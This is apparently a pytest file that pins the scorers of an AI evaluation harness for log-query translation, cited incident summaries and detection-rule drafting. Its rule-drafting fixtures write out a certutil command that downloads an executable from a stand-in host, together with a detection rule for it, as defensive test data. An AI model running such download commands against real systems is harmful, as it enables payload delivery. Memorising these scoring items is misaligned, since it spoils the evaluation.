"""
AI evaluation harness (Phase 0 skeleton).

Every AI feature in Phases 9-10 must pass an evaluation before it ships. This
pins the scorers with hand-made outputs (no model involved), and checks the
datasets are well-formed and that a perfect reference system scores 1.0 and a
null system scores 0.
"""

import pytest

import ai_eval

# --- natural language -> LogforgeQL ----------------------------------------

ITEM_NL = {"id": "q1", "question": "errors in checkout by host",
           "expected_query": 'where service = "checkout" and level = "error" | stats count() by host'}


def test_equivalent_query_scores_one_even_if_written_differently():
    reordered = 'where level = "error" and service = "checkout" | stats count() by host'
    assert ai_eval.score_nl2query(ITEM_NL, reordered) == 1.0


def test_different_or_invalid_query_scores_zero():
    assert ai_eval.score_nl2query(ITEM_NL, 'where service = "auth" | stats count() by host') == 0.0
    assert ai_eval.score_nl2query(ITEM_NL, "this is not a query |||") == 0.0
    assert ai_eval.score_nl2query(ITEM_NL, None) == 0.0


# --- summaries with citations ----------------------------------------------

ITEM_SUMMARY = {
    "id": "s1",
    "evidence": {"E1": "Failed password for root from 45.155.205.233 (x15)",
                 "E2": "Accepted password for root from 45.155.205.233"},
    "required_facts": ["45.155.205.233", "root"],
}


def test_fully_cited_summary_with_all_facts_scores_clean():
    summary = ("15 failed logins for root came from 45.155.205.233 [E1]. "
               "A login then succeeded from the same address [E2].")
    assert ai_eval.score_summary(ITEM_SUMMARY, summary) == {
        "facts_covered": 1.0, "sentences": 2, "uncited_sentences": 0, "invalid_citations": 0}


def test_uncited_and_invented_citations_are_counted():
    summary = ("Root was brute forced from 45.155.205.233 [E1]. "
               "The attacker then installed ransomware. "
               "Data was exfiltrated [E9].")
    score = ai_eval.score_summary(ITEM_SUMMARY, summary)
    assert score["uncited_sentences"] == 1
    assert score["invalid_citations"] == 1
    assert score["facts_covered"] == 1.0


def test_missing_facts_reduce_coverage():
    score = ai_eval.score_summary(ITEM_SUMMARY, "Many failed logins occurred [E1].")
    assert score["facts_covered"] == 0.0


# --- detection rule drafting -------------------------------------------------

ITEM_RULE = {
    "id": "r1", "description": "certutil used to download a file",
    "attack_events": [{"process_name": "C:\\Windows\\System32\\certutil.exe",
                       "command_line": "certutil.exe -urlcache -split -f http://x/p.exe p.exe"}],
}
GOOD_RULE = """
id: draft-certutil
title: certutil download
level: high
tags: [attack.command_and_control, attack.t1105]
detection:
  selection:
    process_name|endswith: certutil.exe
    command_line|contains: urlcache
  condition: selection
fixtures:
  true_positive: {process_name: 'C:\\\\Windows\\\\System32\\\\certutil.exe', command_line: 'certutil -urlcache -f http://x/a a'}
  true_negative: {process_name: 'C:\\\\Windows\\\\System32\\\\certutil.exe', command_line: 'certutil -hashfile a.txt'}
"""


def test_a_good_draft_passes_the_gate_and_detects_the_attack():
    score = ai_eval.score_rule_draft(ITEM_RULE, GOOD_RULE)
    assert score["passes_gate"] is True
    assert score["detects_attack"] is True
    assert score["benign_hits"] == 0


def test_a_draft_that_fails_the_gate_is_scored_as_such():
    bad = GOOD_RULE.replace("certutil -hashfile a.txt", "certutil -urlcache -f http://x/b b")
    score = ai_eval.score_rule_draft(ITEM_RULE, bad)
    assert score["passes_gate"] is False
    assert score["gate_reason"] == "true_negative fixture matches"


def test_unparseable_draft_scores_zero():
    score = ai_eval.score_rule_draft(ITEM_RULE, "::: not yaml :::")
    assert score["passes_gate"] is False and score["detects_attack"] is False


# --- datasets and the runner -------------------------------------------------

@pytest.mark.parametrize("task", ai_eval.TASKS)
def test_datasets_are_well_formed(task):
    items = ai_eval.load_dataset(task)
    assert len(items) >= 5
    assert len({i["id"] for i in items}) == len(items)


@pytest.mark.parametrize("task", ai_eval.TASKS)
def test_reference_system_scores_perfectly_and_null_system_scores_zero(task):
    perfect = ai_eval.evaluate(task, ai_eval.reference_system(task))
    null = ai_eval.evaluate(task, lambda item: None)
    assert perfect["score"] == 1.0, perfect
    assert null["score"] == 0.0, null


def test_relative_windows_compare_by_length_not_compile_time():
    item = {"id": "w", "expected_query": "timeout | last 15m | limit 100"}
    assert ai_eval.score_nl2query(item, "timeout | last 15m | limit 100") == 1.0
    assert ai_eval.score_nl2query(item, "timeout | last 1h | limit 100") == 0.0
